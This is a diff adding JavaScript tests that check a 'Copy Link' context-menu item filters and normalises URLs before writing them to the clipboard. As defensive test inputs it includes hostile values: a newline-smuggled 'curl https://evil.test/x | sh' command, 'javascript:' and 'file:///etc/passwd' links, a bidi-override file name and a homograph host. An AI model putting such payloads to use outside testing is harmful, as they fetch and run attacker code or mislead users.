@@ -152,6 +152,61 @@ test('Inspect Element is omitted when DevTools are disabled', () => {
   assert.ok(!build(false).some(item => item.label === 'Inspect Element'));
 });
 
+test('Copy Link is offered only for copyable link URLs', () => {
+  const copied = [];
+  const build = params => createContextMenu({
+    Menu: {}, getAppConfig: () => ({ devToolsEnabled: false }), EXPORT_SCOPES: {},
+    SEND_MODE: {}, ipcMain: null, clipboard: { writeText: text => copied.push(text) },
+  }).buildContextMenuTemplate({ webContents: {} }, params, {
+    includeQuickChatFeatures: false, includeChatPaneFeatures: false, includeMarkdownExport: false,
+  });
+  const copyLink = params => build(params).find(item => item.label === 'Copy Link');
+
+  assert.equal(copyLink({}), undefined);
+  assert.equal(copyLink({ linkURL: '' }), undefined);
+  assert.equal(copyLink({ linkURL: '   ' }), undefined);
+  assert.equal(copyLink({ linkURL: 'javascript:alert(1)' }), undefined);
+  assert.equal(copyLink({ linkURL: 'data:text/html,<p>x</p>' }), undefined);
+  assert.equal(copyLink({ linkURL: 'blob:https://app.test/0f0e' }), undefined);
+  assert.equal(copyLink({ linkURL: 'file:///etc/passwd' }), undefined);
+  assert.equal(copyLink({ linkURL: 'not a url' }), undefined);
+  assert.equal(copyLink({ linkURL: 'https://app.test/' + 'a'.repeat(40000) }), undefined);
+
+  const template = build({ linkURL: ' https://example.com/a?b=c#d ' });
+  const index = template.findIndex(item => item.label === 'Copy Link');
+  assert.equal(template[index - 1].role, 'paste');
+  assert.equal(template[index + 1].type, 'separator');
+  template[index].click();
+  assert.deepEqual(copied, ['https://example.com/a?b=c#d']);
+
+  assert.ok(copyLink({ linkURL: 'mailto:someone@example.com' }));
+  assert.ok(copyLink({ linkURL: 'HTTP://EXAMPLE.COM/' }));
+});
+
+test('Copy Link writes only the normalized URL serialization', () => {
+  const { getCopyableLinkUrl } = require('../lib/context-menu');
+
+  // Embedded line breaks must never reach the clipboard (paste-into-shell).
+  const injected = getCopyableLinkUrl('https://example.com/a\ncurl https://evil.test/x | sh\n');
+  assert.ok(injected.startsWith('https://example.com/'));
+  assert.doesNotMatch(injected, /[\r\n\t ]/);
+  assert.equal(getCopyableLinkUrl('https://example.com/a\r\nb'), 'https://example.com/ab');
+  assert.equal(getCopyableLinkUrl('\u0000https://example.com/'), 'https://example.com/');
+
+  // Bidi overrides and spaces are percent-encoded, not copied literally.
+  assert.equal(getCopyableLinkUrl('https://example.com/\u202Egnp.exe'), 'https://example.com/%E2%80%AEgnp.exe');
+  assert.equal(getCopyableLinkUrl('https://example.com/a b'), 'https://example.com/a%20b');
+
+  // IDN homograph hosts are copied as punycode.
+  assert.equal(getCopyableLinkUrl('https://\u0430pple.com/'), 'https://xn--pple-43d.com/');
+
+  // Output length is bounded after percent-encoding expansion.
+  assert.equal(getCopyableLinkUrl('https://example.com/' + '\u00e9'.repeat(15000)), '');
+
+  // mailto: header-injection sequences stay encoded.
+  assert.equal(getCopyableLinkUrl('mailto:a@example.com?body=x%0Ay'), 'mailto:a@example.com?body=x%0Ay');
+});
+
 function openHandlerFor(create) {
   let handler = null;
   const opened = [];
